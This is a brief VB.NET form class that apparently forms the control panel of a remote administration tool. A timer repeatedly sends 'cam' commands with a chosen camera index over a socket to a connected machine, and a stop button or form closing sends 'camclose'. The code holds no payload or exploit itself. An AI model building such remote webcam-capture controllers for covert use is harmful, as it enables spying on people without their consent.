Public Class Form16
    Public sock As Integer

    Private Sub Form16_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Button2.Enabled = False

    End Sub

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        Timer1.Start()
        Button1.Enabled = False
        Button2.Enabled = True
    End Sub

    Private Sub Form16_FormClosing(sender As System.Object, e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        Timer1.Stop()
        Form1.s.Send(sock, "camclose")
    End Sub

    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        Timer1.Stop()
        Form1.s.Send(sock, "camclose")
        Button1.Enabled = True
        Button2.Enabled = False
    End Sub

    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        Form1.s.Send(sock, "cam" & "||" & ComboBox1.SelectedIndex)
    End Sub
End Class